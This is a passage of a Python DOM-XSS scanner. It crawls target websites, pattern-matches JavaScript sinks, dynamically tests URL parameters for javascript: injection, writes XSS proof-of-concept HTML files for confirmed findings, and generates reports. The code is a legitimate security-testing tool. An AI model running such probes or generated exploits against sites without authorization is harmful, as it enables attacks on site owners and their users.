            for pattern in vuln_info["patterns"]:
                try:
                    matches = list(re.finditer(pattern, code, re.IGNORECASE))
                    for match in matches:
                        line_num = self.get_line_number(code, match.start())
                        snippet = self.get_code_snippet(code, match.start())
                        context = self.get_context(code, match.start())

                        finding = VulnFinding(
                            vuln_type=f"react_{vuln_name}",
                            severity=vuln_info["severity"],
                            source=match.group(),
                            js_file=js_file,
                            line_number=line_num,
                            code_snippet=snippet,
                            context=context[:1000],
                            description=vuln_info["description"],
                            cwe_id=vuln_info.get("cwe", ""),
                            remediation=vuln_info.get("remediation", ""),
                        )
                        findings.append(finding)
                except re.error:
                    pass

        return findings

    def full_analysis(self, code: str, js_file: str) -> List[VulnFinding]:
        """Run full analysis pipeline on JavaScript code."""
        all_findings = []
        all_findings.extend(self.analyze_sinks(code, js_file))
        all_findings.extend(self.analyze_postmessage(code, js_file))
        all_findings.extend(self.analyze_sensitive_data(code, js_file))
        all_findings.extend(self.analyze_framework_specific(code, js_file))
        return self._deduplicate_findings(all_findings)

    @staticmethod
    def _downgrade_severity(severity: str) -> str:
        """Downgrade severity by one level."""
        levels = ["critical", "high", "medium", "low", "info"]
        try:
            idx = levels.index(severity)
            return levels[min(idx + 1, len(levels) - 1)]
        except ValueError:
            return "info"

    @staticmethod
    def _deduplicate_findings(findings: List[VulnFinding]) -> List[VulnFinding]:
        """Remove duplicate findings based on key attributes."""
        seen = set()
        unique = []
        for f in findings:
            key = hashlib.md5(
                f"{f.vuln_type}:{f.js_file}:{f.line_number}:{f.code_snippet[:100]}".encode()
            ).hexdigest()
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique


# ─────────────────────────────────────────────
# Web Crawler & JS Collector
# ─────────────────────────────────────────────

class JSCollector:
    """Collects JavaScript files and inline scripts from target URLs."""

    def __init__(self, session: requests.Session, max_depth: int = 2,
                 same_origin: bool = True):
        self.session = session
        self.max_depth = max_depth
        self.same_origin = same_origin
        self.visited_urls: Set[str] = set()
        self.js_files: Set[str] = set()
        self.inline_scripts: List[str] = []
        self.logger = logging.getLogger("JSCollector")

    def _is_same_origin(self, url: str, base_url: str) -> bool:
        """Check if URL is same origin as base."""
        base_ext = tldextract.extract(base_url)
        url_ext = tldextract.extract(url)
        return (base_ext.domain == url_ext.domain and
                base_ext.suffix == url_ext.suffix)

    def _normalize_url(self, url: str, base_url: str) -> str:
        """Normalize relative URL to absolute."""
        if url.startswith("//"):
            parsed_base = urllib.parse.urlparse(base_url)
            return f"{parsed_base.scheme}:{url}"
        elif url.startswith("/"):
            parsed_base = urllib.parse.urlparse(base_url)
            return f"{parsed_base.scheme}://{parsed_base.netloc}{url}"
        elif url.startswith("http"):
            return url
        elif url.startswith("data:") or url.startswith("blob:") or url.startswith("javascript:"):
            return ""
        else:
            # Relative URL
            base_dir = base_url.rsplit('/', 1)[0]
            return f"{base_dir}/{url}"

    def _fetch_url(self, url: str) -> Optional[str]:
        """Fetch URL content with error handling."""
        try:
            resp = self.session.get(url, timeout=15, allow_redirects=True)
            resp.raise_for_status()
            return resp.text
        except requests.RequestException as e:
            self.logger.debug(f"Failed to fetch {url}: {e}")
            return None

    def collect_from_page(self, url: str, base_url: str, depth: int = 0):
        """Recursively collect JS from a page."""
        if depth > self.max_depth:
            return
        if url in self.visited_urls:
            return

        # Normalize and validate
        url = self._normalize_url(url, base_url)
        if not url or not url.startswith("http"):
            return

        if self.same_origin and not self._is_same_origin(url, base_url):
            return

        self.visited_urls.add(url)
        self.logger.info(f"Crawling [{depth}]: {url}")

        html_content = self._fetch_url(url)
        if not html_content:
            return

        try:
            soup = BeautifulSoup(html_content, 'html.parser')
        except Exception as e:
            self.logger.debug(f"HTML parsing failed for {url}: {e}")
            return

        # Extract external JS files
        for script_tag in soup.find_all('script', src=True):
            js_url = script_tag['src']
            js_url = self._normalize_url(js_url, url)
            if js_url and js_url.startswith("http"):
                self.js_files.add(js_url)

        # Extract inline scripts
        for script_tag in soup.find_all('script', src=False):
            if script_tag.string and len(script_tag.string.strip()) > 10:
                self.inline_scripts.append(script_tag.string)

        # Extract JS from event handlers in HTML attributes
        event_attrs = [
            'onclick', 'onload', 'onerror', 'onmouseover', 'onmouseout',
            'onfocus', 'onblur', 'onsubmit', 'onchange', 'onkeyup',
            'onkeydown', 'onkeypress', 'onresize', 'onscroll',
            'onunload', 'onbeforeunload', 'onhashchange', 'onpopstate',
            'onmessage', 'onstorage', 'oninput', 'ondrag', 'ondrop',
        ]
        for tag in soup.find_all(True):
            for attr in event_attrs:
                if tag.get(attr):
                    self.inline_scripts.append(tag[attr])

        # Extract JS from href="javascript:..."
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            if href.lower().startswith('javascript:'):
                self.inline_scripts.append(href[11:])

        # Recurse into linked pages
        if depth < self.max_depth:
            for a_tag in soup.find_all('a', href=True):
                link = a_tag['href']
                if link.startswith('#') or link.startswith('mailto:') or link.startswith('tel:'):
                    continue
                normalized_link = self._normalize_url(link, url)
                if normalized_link and normalized_link.startswith("http"):
                    self.collect_from_page(normalized_link, base_url, depth + 1)

    def fetch_js_content(self, js_url: str) -> Optional[Tuple[str, str]]:
        """Fetch and return JS file content."""
        content = self._fetch_url(js_url)
        if content:
            return (js_url, content)
        return None


# ─────────────────────────────────────────────
# Report Generator
# ─────────────────────────────────────────────

class ReportGenerator:
    """Generate scan reports in multiple formats."""

    SEVERITY_COLORS = {
        "critical": Fore.RED + Style.BRIGHT,
        "high": Fore.RED,
        "medium": Fore.YELLOW,
        "low": Fore.CYAN,
        "info": Fore.WHITE,
    }

    SEVERITY_ICONS = {
        "critical": "🔴",
        "high": "🟠",
        "medium": "🟡",
        "low": "🔵",
        "info": "⚪",
    }

    @classmethod
    def print_banner(cls):
        """Print tool banner."""
        banner = f"""
{Fore.RED + Style.BRIGHT}
 ██████╗  ██████╗ ███╗   ███╗    ██╗  ██╗███████╗███████╗
 ██╔══██╗██╔═══██╗████╗ ████║    ╚██╗██╔╝██╔════╝██╔════╝
 ██║  ██║██║   ██║██╔████╔██║     ╚███╔╝ ███████╗███████╗
 ██║  ██║██║   ██║██║╚██╔╝██║     ██╔██╗ ╚════██║╚════██║
 ██████╔╝╚██████╔╝██║ ╚═╝ ██║    ██╔╝ ██╗███████║███████║
 ╚═════╝  ╚═════╝ ╚═╝     ╚═╝    ╚═╝  ╚═╝╚══════╝╚══════╝
{Fore.CYAN}         DOM-Based Vulnerability Scanner & XSS PoC Generator
{Fore.YELLOW}         Developed by Vishal Bharad
{Style.RESET_ALL}"""
        print(banner)

    @classmethod
    def print_finding(cls, finding: VulnFinding, index: int):
        """Print a single finding to console."""
        color = cls.SEVERITY_COLORS.get(finding.severity, Fore.WHITE)
        icon = cls.SEVERITY_ICONS.get(finding.severity, "⚪")
        confirmed_tag = f" {Fore.GREEN + Style.BRIGHT}[✓ CONFIRMED]{Style.RESET_ALL}" if finding.confirmed else ""

        print(f"\n{'─' * 70}")
        print(f"{color}{icon} Finding #{index + 1}: {finding.vuln_type}{confirmed_tag}{Style.RESET_ALL}")
        print(f"{'─' * 70}")
        print(f"  {Fore.WHITE}Severity:    {color}{finding.severity.upper()}{Style.RESET_ALL}")
        if finding.confirmed:
            print(f"  {Fore.WHITE}Status:      {Fore.GREEN + Style.BRIGHT}CONFIRMED (dynamically verified){Style.RESET_ALL}")
        print(f"  {Fore.WHITE}CWE:         {Fore.CYAN}{finding.cwe_id}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}File:        {Fore.GREEN}{finding.js_file}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Line:        {Fore.GREEN}{finding.line_number}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Source:      {Fore.YELLOW}{finding.source[:150]}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Description: {finding.description}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Remediation: {Fore.GREEN}{finding.remediation}{Style.RESET_ALL}")
        print(f"\n  {Fore.WHITE}Code Snippet:{Style.RESET_ALL}")
        for line in finding.code_snippet.split('\n'):
            if line.startswith(">>>"):
                print(f"  {Fore.RED}{line}{Style.RESET_ALL}")
            else:
                print(f"  {Fore.WHITE}{line}{Style.RESET_ALL}")

    @classmethod
    def print_summary(cls, result: ScanResult):
        """Print scan summary to console."""
        print(f"\n{'═' * 70}")
        print(f"{Fore.CYAN + Style.BRIGHT}                    SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{'═' * 70}")
        print(f"  {Fore.WHITE}Target:           {Fore.GREEN}{result.target_url}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Scan Time:        {Fore.GREEN}{result.scan_time}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}JS Files Scanned: {Fore.GREEN}{len(result.js_files)}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Inline Scripts:   {Fore.GREEN}{len(result.inline_scripts)}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Total JS Size:    {Fore.GREEN}{result.total_js_size / 1024:.1f} KB{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Total Findings:   {Fore.GREEN}{len(result.findings)}{Style.RESET_ALL}")

        # Count by severity
        severity_counts = {}
        for f in result.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

        print(f"\n  {Fore.WHITE}Findings by Severity:{Style.RESET_ALL}")
        for sev in ["critical", "high", "medium", "low", "info"]:
            count = severity_counts.get(sev, 0)
            color = cls.SEVERITY_COLORS.get(sev, Fore.WHITE)
            icon = cls.SEVERITY_ICONS.get(sev, "⚪")
            bar = "█" * count + "░" * (max(0, 20 - count))
            print(f"    {icon} {color}{sev.upper():10s} {bar} {count}{Style.RESET_ALL}")

        # Count by type
        type_counts = {}
        for f in result.findings:
            type_counts[f.vuln_type] = type_counts.get(f.vuln_type, 0) + 1

        if type_counts:
            print(f"\n  {Fore.WHITE}Findings by Type:{Style.RESET_ALL}")
            for vuln_type, count in sorted(type_counts.items(), key=lambda x: -x[1]):
                print(f"    {Fore.CYAN}• {vuln_type}: {count}{Style.RESET_ALL}")

        print(f"{'═' * 70}\n")

    @staticmethod
    def generate_json_report(result: ScanResult) -> str:
        """Generate JSON report."""
        report = {
            "scan_info": {
                "target_url": result.target_url,
                "scan_time": result.scan_time,
                "js_files_scanned": len(result.js_files),
                "inline_scripts_scanned": len(result.inline_scripts),
                "total_js_size_bytes": result.total_js_size,
                "total_findings": len(result.findings),
            },
            "js_files": result.js_files,
            "findings": [],
        }

        for f in result.findings:
            report["findings"].append({
                "vuln_type": f.vuln_type,
                "severity": f.severity,
                "confirmed": f.confirmed,
                "cwe_id": f.cwe_id,
                "source": f.source,
                "js_file": f.js_file,
                "line_number": f.line_number,
                "code_snippet": f.code_snippet,
                "description": f.description,
                "remediation": f.remediation,
            })

        return json.dumps(report, indent=2, ensure_ascii=False)

    @staticmethod
    def generate_html_report(result: ScanResult) -> str:
        """Generate comprehensive HTML report."""
        severity_counts = {}
        for f in result.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

        findings_html = ""
        for i, f in enumerate(result.findings):
            severity_class = f"severity-{f.severity}"
            escaped_snippet = f.code_snippet.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            escaped_source = f.source.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

            findings_html += f"""
            <div class="finding {severity_class}">
                <div class="finding-header">
                    <span class="finding-title">#{i+1} {f.vuln_type}</span>
                    <span class="badge badge-{f.severity}">{f.severity.upper()}</span>
                </div>
                <table class="finding-details">
                    <tr><td>CWE</td><td>{f.cwe_id}</td></tr>
                    <tr><td>File</td><td><a href="{f.js_file}" target="_blank">{f.js_file}</a></td></tr>
                    <tr><td>Line</td><td>{f.line_number}</td></tr>
                    <tr><td>Source</td><td><code>{escaped_source[:200]}</code></td></tr>
                    <tr><td>Description</td><td>{f.description}</td></tr>
                    <tr><td>Remediation</td><td>{f.remediation}</td></tr>
                </table>
                <div class="code-block"><pre>{escaped_snippet}</pre></div>
            </div>"""

        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DOM XSS Scan Report - {result.target_url}</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; line-height: 1.6; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
        h1 {{ color: #e94560; font-size: 28px; margin-bottom: 5px; }}
        h2 {{ color: #58a6ff; margin: 30px 0 15px; border-bottom: 1px solid #21262d; padding-bottom: 8px; }}
        .header {{ background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 25px; margin-bottom: 25px; }}
        .header p {{ color: #8b949e; margin-top: 5px; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }}
        .stat-card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; text-align: center }}
        .stat-card .stat-value {{ font-size: 36px; font-weight: bold; color: #58a6ff; }}
        .stat-card .stat-label {{ color: #8b949e; font-size: 14px; margin-top: 5px; }}
        .severity-bar {{ display: flex; gap: 10px; margin: 15px 0; flex-wrap: wrap; }}
        .badge {{ padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; }}
        .badge-critical {{ background: #ff0000; color: white; }}
        .badge-high {{ background: #ff6600; color: white; }}
        .badge-medium {{ background: #ffcc00; color: black; }}
        .badge-low {{ background: #00aaff; color: white; }}
        .badge-info {{ background: #666; color: white; }}
        .finding {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin: 15px 0; overflow: hidden; }}
        .finding.severity-critical {{ border-left: 4px solid #ff0000; }}
        .finding.severity-high {{ border-left: 4px solid #ff6600; }}
        .finding.severity-medium {{ border-left: 4px solid #ffcc00; }}
        .finding.severity-low {{ border-left: 4px solid #00aaff; }}
        .finding.severity-info {{ border-left: 4px solid #666; }}
        .finding-header {{ display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: #1c2128; }}
        .finding-title {{ font-weight: bold; font-size: 16px; color: #e0e0e0; }}
        .finding-details {{ width: 100%; padding: 0 20px; }}
        .finding-details td {{ padding: 8px 10px; border-bottom: 1px solid #21262d; vertical-align: top; }}
        .finding-details td:first-child {{ font-weight: bold; color: #58a6ff; width: 130px; white-space: nowrap; }}
        .finding-details a {{ color: #58a6ff; text-decoration: none; }}
        .finding-details a:hover {{ text-decoration: underline; }}
        .finding-details code {{ background: #0d1117; padding: 2px 6px; border-radius: 3px; font-size: 13px; word-break: break-all; }}
        .code-block {{ background: #0d1117; margin: 10px 20px 20px; border-radius: 5px; overflow-x: auto; }}
        .code-block pre {{ padding: 15px; font-family: 'Courier New', monospace; font-size: 13px; line-height: 1.5; white-space: pre-wrap; word-break: break-all; }}
        .filter-bar {{ margin: 20px 0; display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }}
        .filter-btn {{ padding: 6px 16px; border-radius: 20px; border: 1px solid #30363d; background: #161b22; color: #c9d1d9; cursor: pointer; font-size: 13px; transition: all 0.2s; }}
        .filter-btn:hover, .filter-btn.active {{ background: #58a6ff; color: white; border-color: #58a6ff; }}
        .js-files-list {{ list-style: none; padding: 0; }}
        .js-files-list li {{ background: #161b22; margin: 5px 0; padding: 10px 15px; border-radius: 5px; border: 1px solid #30363d; }}
        .js-files-list li a {{ color: #58a6ff; text-decoration: none; word-break: break-all; }}
        .js-files-list li a:hover {{ text-decoration: underline; }}
        .footer {{ text-align: center; margin-top: 40px; padding: 20px; color: #484f58; border-top: 1px solid #21262d; }}
        @media (max-width: 768px) {{
            .stats-grid {{ grid-template-columns: repeat(2, 1fr); }}
            .finding-header {{ flex-direction: column; gap: 8px; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔴 DOM XSS Vulnerability Scan Report</h1>
            <p>Target: <strong>{result.target_url}</strong></p>
            <p>Scan Time: {result.scan_time}</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value">{len(result.findings)}</div>
                <div class="stat-label">Total Findings</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" style="color: #ff0000;">{severity_counts.get('critical', 0)}</div>
                <div class="stat-label">Critical</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" style="color: #ff6600;">{severity_counts.get('high', 0)}</div>
                <div class="stat-label">High</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" style="color: #ffcc00;">{severity_counts.get('medium', 0)}</div>
                <div class="stat-label">Medium</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{len(result.js_files)}</div>
                <div class="stat-label">JS Files Scanned</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{result.total_js_size / 1024:.1f} KB</div>
                <div class="stat-label">Total JS Size</div>
            </div>
        </div>

        <h2>📋 Findings</h2>

        <div class="filter-bar">
            <span style="color: #8b949e;">Filter:</span>
            <button class="filter-btn active" onclick="filterFindings('all')">All ({len(result.findings)})</button>
            <button class="filter-btn" onclick="filterFindings('critical')">Critical ({severity_counts.get('critical', 0)})</button>
            <button class="filter-btn" onclick="filterFindings('high')">High ({severity_counts.get('high', 0)})</button>
            <button class="filter-btn" onclick="filterFindings('medium')">Medium ({severity_counts.get('medium', 0)})</button>
            <button class="filter-btn" onclick="filterFindings('low')">Low ({severity_counts.get('low', 0)})</button>
            <button class="filter-btn" onclick="filterFindings('info')">Info ({severity_counts.get('info', 0)})</button>
        </div>

        <div id="findingsContainer">
            {findings_html}
        </div>

        <h2>📁 Scanned JavaScript Files</h2>
        <ul class="js-files-list">
            {"".join(f'<li><a href="{js}" target="_blank">{js}</a></li>' for js in result.js_files)}
        </ul>

        <div class="footer">
            <p>Generated by DOM XSS Scanner | Developed by Vishal Bharad | {result.scan_time}</p>
            <p>Developed by Vishal Bharad</p>
        </div>
    </div>

    <script>
        function filterFindings(severity) {{
            const findings = document.querySelectorAll('.finding');
            const buttons = document.querySelectorAll('.filter-btn');

            buttons.forEach(b => b.classList.remove('active'));
            event.target.classList.add('active');

            findings.forEach(f => {{
                if (severity === 'all') {{
                    f.style.display = 'block';
                }} else {{
                    f.style.display = f.classList.contains('severity-' + severity) ? 'block' : 'none';
                }}
            }});
        }}
    </script>
</body>
</html>"""


# ─────────────────────────────────────────────
# Main Scanner Orchestrator
# ─────────────────────────────────────────────

class DOMXSSScanner:
    """Main scanner orchestrating JS collection, analysis, and reporting."""

    def __init__(self, args):
        self.args = args
        self.logger = self._setup_logging()
        self.session = self._setup_session()
        self.analyzer = JSAnalyzer(beautify=not args.no_beautify)
        self.results: List[ScanResult] = []

    def _setup_logging(self) -> logging.Logger:
        """Configure logging."""
        logger = logging.getLogger("DOMXSSScanner")
        level = logging.DEBUG if self.args.verbose else logging.INFO
        logger.setLevel(level)

        handler = logging.StreamHandler()
        handler.setLevel(level)
        formatter = logging.Formatter(
            f'{Fore.CYAN}[%(asctime)s]{Style.RESET_ALL} '
            f'{Fore.GREEN}%(name)s{Style.RESET_ALL} - '
            f'%(message)s',
            datefmt='%H:%M:%S'
        )
        handler.setFormatter(formatter)

        if not logger.handlers:
            logger.addHandler(handler)

        return logger

    def _setup_session(self) -> requests.Session:
        """Configure requests session."""
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,'
                      'application/javascript,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })

        if self.args.cookies:
            for cookie in self.args.cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    session.cookies.set(name.strip(), value.strip())

        if self.args.headers:
            for header in self.args.headers:
                if ':' in header:
                    name, value = header.split(':', 1)
                    session.headers[name.strip()] = value.strip()

        if self.args.proxy:
            session.proxies = {
                'http': self.args.proxy,
                'https': self.args.proxy,
            }
            session.verify = False
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        return session

    def scan_target(self, target_url: str) -> ScanResult:
        """Scan a single target URL."""
        start_time = datetime.now()
        self.logger.info(f"Starting scan of: {target_url}")

        result = ScanResult(
            target_url=target_url,
            scan_time=start_time.isoformat(),
        )

        # Phase 1: Collect JavaScript
        self.logger.info("Phase 1: Collecting JavaScript files and inline scripts...")
        collector = JSCollector(
            self.session,
            max_depth=self.args.depth,
            same_origin=not self.args.all_origins,
        )
        collector.collect_from_page(target_url, target_url)

        result.js_files = list(collector.js_files)
        result.inline_scripts = collector.inline_scripts

        self.logger.info(
            f"Found {len(result.js_files)} external JS files and "
            f"{len(result.inline_scripts)} inline scripts"
        )

        # Phase 2: Fetch and analyze external JS files
        self.logger.info("Phase 2: Fetching and analyzing JavaScript files...")
        all_findings = []

        # Fetch external JS files with thread pool
        js_contents = {}
        with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            future_to_url = {
                executor.submit(collector.fetch_js_content, js_url): js_url
                for js_url in result.js_files
            }
            for future in as_completed(future_to_url):
                result_data = future.result()
                if result_data:
                    js_url, content = result_data
                    js_contents[js_url] = content
                    result.total_js_size += len(content)

        # Analyze external JS files
        for js_url, content in js_contents.items():
            self.logger.info(f"Analyzing: {js_url} ({len(content)} bytes)")
            findings = self.analyzer.full_analysis(content, js_url)
            all_findings.extend(findings)

        # Phase 3: Analyze inline scripts
        self.logger.info("Phase 3: Analyzing inline scripts...")
        for i, script in enumerate(result.inline_scripts):
            script_name = f"inline_script_{i+1}@{target_url}"
            result.total_js_size += len(script)
            findings = self.analyzer.full_analysis(script, script_name)
            all_findings.extend(findings)

        # Phase 3.5: Dynamic URL parameter testing for javascript: protocol injection
        if not self.args.no_dynamic:
            self.logger.info("Phase 3.5: Dynamic testing URL parameters for javascript: protocol injection...")
            dynamic_tester = DynamicParamTester(self.session, self.logger)
            # Add any user-specified extra params
            if self.args.extra_params:
                DynamicParamTester.REDIRECT_PARAMS.extend(self.args.extra_params)
            dynamic_findings = dynamic_tester.test_url(target_url)
            all_findings.extend(dynamic_findings)
            if dynamic_findings:
                self.logger.info(
                    f"{Fore.RED}[!] Dynamic testing found {len(dynamic_findings)} "
                    f"javascript: protocol injection(s)!{Style.RESET_ALL}"
                )

        # Phase 4: Generate PoC HTML files ONLY for CONFIRMED XSS findings
        self.logger.info("Phase 4: Generating PoC files for CONFIRMED findings only...")
        poc_dir = os.path.join(self.args.output_dir, "pocs")
        os.makedirs(poc_dir, exist_ok=True)

        confirmed_findings = [f for f in all_findings if f.confirmed]
        self.logger.info(f"Confirmed XSS findings: {len(confirmed_findings)}")

        for i, finding in enumerate(confirmed_findings):
            poc_html = PoCGenerator.generate_poc(target_url, finding)
            finding.poc_html = poc_html

            if self.args.generate_pocs:
                safe_type = re.sub(r'[^\w]', '_', finding.vuln_type)
                poc_filename = f"poc_CONFIRMED_{i+1}_{safe_type}_{finding.severity}.html"
                poc_path = os.path.join(poc_dir, poc_filename)
                try:
                    with open(poc_path, 'w', encoding='utf-8') as f:
                        f.write(poc_html)
                    self.logger.info(
                        f"{Fore.GREEN}[✓] CONFIRMED PoC saved: {poc_path}{Style.RESET_ALL}"
                    )
                except IOError as e:
                    self.logger.error(f"Failed to save PoC: {e}")

        # Deduplicate and sort findings
        result.findings = self.analyzer._deduplicate_findings(all_findings)
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        result.findings.sort(key=lambda f: severity_order.get(f.severity, 5))

        elapsed = (datetime.now() - start_time).total_seconds()
        result.scan_time = f"{start_time.strftime('%Y-%m-%d %H:%M:%S')} (Duration: {elapsed:.1f}s)"

        return result

    def run(self):
        """Main execution entry point."""
        ReportGenerator.print_banner()

        # Gather target URLs
        targets = []
        if self.args.url:
            targets.append(self.args.url)
        if self.args.url_list:
            try:
                with open(self.args.url_list, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            targets.append(line)
            except IOError as e:
                self.logger.error(f"Failed to read URL list file: {e}")
                sys.exit(1)
        if self.args.js_file:
            # Direct JS file analysis mode
            self._analyze_local_js_files()
            return

        if not targets:
            self.logger.error("No targets specified. Use -u URL or -l URL_LIST or --js-file FILE")
            sys.exit(1)

        # Scan each target
        for target in targets:
            # Ensure URL has scheme
            if not target.startswith("http://") and not target.startswith("https://"):
                target = "https://" + target

            try:
                result = self.scan_target(target)
                self.results.append(result)

                # Print findings to console
                if result.findings:
                    for i, finding in enumerate(result.findings):
                        ReportGenerator.print_finding(finding, i)
                else:
                    print(f"\n{Fore.GREEN}[✓] No vulnerabilities found for {target}{Style.RESET_ALL}")

                ReportGenerator.print_summary(result)

            except KeyboardInterrupt:
                self.logger.warning("Scan interrupted by user.")
                break
            except Exception as e:
                self.logger.error(f"Error scanning {target}: {e}")
                if self.args.verbose:
                    import traceback
                    traceback.print_exc()

        # Generate reports
        self._generate_reports()

    def _analyze_local_js_files(self):
        """Analyze local JavaScript files directly."""
        js_files = []
        for path in self.args.js_file:
            if os.path.isfile(path):
                js_files.append(path)
            elif os.path.isdir(path):
                for root, dirs, files in os.walk(path):
                    for fname in files:
                        if fname.endswith(('.js', '.jsx', '.ts', '.tsx', '.mjs')):
                            js_files.append(os.path.join(root, fname))
            else:
                self.logger.warning(f"Path not found: {path}")

        if not js_files:
            self.logger.error("No JavaScript files found to analyze.")
            sys.exit(1)

        self.logger.info(f"Analyzing {len(js_files)} local JavaScript file(s)...")

        result = ScanResult(
            target_url="local_files",
            scan_time=datetime.now().isoformat(),
        )

        all_findings = []
        for js_path in js_files:
            try:
                with open(js_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                result.js_files.append(js_path)
                result.total_js_size += len(content)
                self.logger.info(f"Analyzing: {js_path} ({len(content)} bytes)")
                findings = self.analyzer.full_analysis(content, js_path)
                all_findings.extend(findings)
            except IOError as e:
                self.logger.error(f"Failed to read {js_path}: {e}")

        # Deduplicate and sort
        result.findings = self.analyzer._deduplicate_findings(all_findings)
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        result.findings.sort(key=lambda f: severity_order.get(f.severity, 5))

        # Generate PoCs for local analysis - only for confirmed findings
        if self.args.generate_pocs:
            poc_dir = os.path.join(self.args.output_dir, "pocs")
            os.makedirs(poc_dir, exist_ok=True)
            confirmed_findings = [f for f in result.findings if f.confirmed]
            for i, finding in enumerate(confirmed_findings):
                poc_html = PoCGenerator.generate_poc("http://TARGET_URL", finding)
                finding.poc_html = poc_html
                safe_type = re.sub(r'[^\w]', '_', finding.vuln_type)
                poc_filename = f"poc_CONFIRMED_{i+1}_{safe_type}_{finding.severity}.html"
                poc_path = os.path.join(poc_dir, poc_filename)
                try:
                    with open(poc_path, 'w', encoding='utf-8') as f:
                        f.write(poc_html)
                    self.logger.info(f"{Fore.GREEN}[✓] CONFIRMED PoC saved: {poc_path}{Style.RESET_ALL}")
                except IOError as e:
                    self.logger.error(f"Failed to save PoC: {e}")

        self.results.append(result)

        # Print findings
        if result.findings:
            for i, finding in enumerate(result.findings):
                ReportGenerator.print_finding(finding, i)
        else:
            print(f"\n{Fore.GREEN}[✓] No vulnerabilities found in local files.{Style.RESET_ALL}")

        ReportGenerator.print_summary(result)
        self._generate_reports()

    def _generate_reports(self):
        """Generate output reports in requested formats."""
        if not self.results:
            return

        os.makedirs(self.args.output_dir, exist_ok=True)

        for result in self.results:
            # Sanitize target for filename
            safe_target = re.sub(r'[^\w\-.]', '_', result.target_url)[:80]
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

            # JSON report
            if 'json' in self.args.report_format or 'all' in self.args.report_format:
                json_path = os.path.join(
                    self.args.output_dir, f"report_{safe_target}_{timestamp}.json"
                )
                try:
                    json_report = ReportGenerator.generate_json_report(result)
                    with open(json_path, 'w', encoding='utf-8') as f:
                        f.write(json_report)
                    self.logger.info(f"JSON report saved: {json_path}")
                except IOError as e:
                    self.logger.error(f"Failed to save JSON report: {e}")

            # HTML report
            if 'html' in self.args.report_format or 'all' in self.args.report_format:
                html_path = os.path.join(
                    self.args.output_dir, f"report_{safe_target}_{timestamp}.html"
                )
                try:
                    html_report = ReportGenerator.generate_html_report(result)
                    with open(html_path, 'w', encoding='utf-8') as f:
                        f.write(html_report)
                    self.logger.info(f"HTML report saved: {html_path}")
                except IOError as e:
                    self.logger.error(f"Failed to save HTML report: {e}")

            # Text report
            if 'txt' in self.args.report_format or 'all' in self.args.report_format:
                txt_path = os.path.join(
                    self.args.output_dir, f"report_{safe_target}_{timestamp}.txt"
                )
                try:
                    with open(txt_path, 'w', encoding='utf-8') as f:
                        f.write(self._generate_text_report(result))
                    self.logger.info(f"Text report saved: {txt_path}")
                except IOError as e:
                    self.logger.error(f"Failed to save text report: {e}")

        # Summary across all targets
        total_findings = sum(len(r.findings) for r in self.results)
        total_critical = sum(
            1 for r in self.results for f in r.findings if f.severity == "critical"
        )
        total_high = sum(
            1 for r in self.results for f in r.findings if f.severity == "high"
        )

        print(f"\n{Fore.CYAN + Style.BRIGHT}{'═' * 70}")
        print(f"  FINAL SUMMARY")
        print(f"{'═' * 70}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Targets Scanned:  {Fore.GREEN}{len(self.results)}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Total Findings:   {Fore.GREEN}{total_findings}{Style.RESET_ALL}")
